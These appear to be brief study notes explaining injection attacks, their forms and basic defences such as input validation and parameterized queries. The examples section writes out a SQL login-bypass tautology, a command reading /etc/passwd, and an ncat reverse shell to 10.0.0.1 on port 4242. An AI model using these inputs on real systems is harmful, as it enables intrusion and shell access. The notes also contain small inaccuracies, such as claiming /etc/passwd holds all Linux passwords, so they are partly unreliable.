Injection

Injection in the process of inserting malicious code into a website or application. Typically this is SQL injected as readable code which is then run in a database. Any interpreter that combines data into commands are vulnerable to Injection based attacks.

Forms of Injection

  • SQL Injection
  • LDAP Injection
  • OS Injection
  • Command Execution
  • Ruby Injection
  • Shock Shell
  • ...

Injection happens when untrusted data is directly interpreted. There are many methods of cleaning this data before it is interpreted, but not all of this is automatic. For example, taking in SQL data as string literals will treat the data as uninterpretable strings. Other Forms can be harder to prevent malicious injection such as HTTP requests, URL query strings, form fields, headers, and even(especially?) cookies.

By entering in commands and having the system read them as such, hackers can gain privalaged access to your system and execute code and instructions as if they were admins.

Examples

  • 101 or 1=1 which can login bypass
  • cat/etc/passwd to read all linux pass words
  • ncat 10.0.0.1 4242 -e /bin/bash gives a complete application shell

Best Practices

  • Validate Input
  • Escaping or Output encode inputs to read them as string literals
  • Use parameterize queries
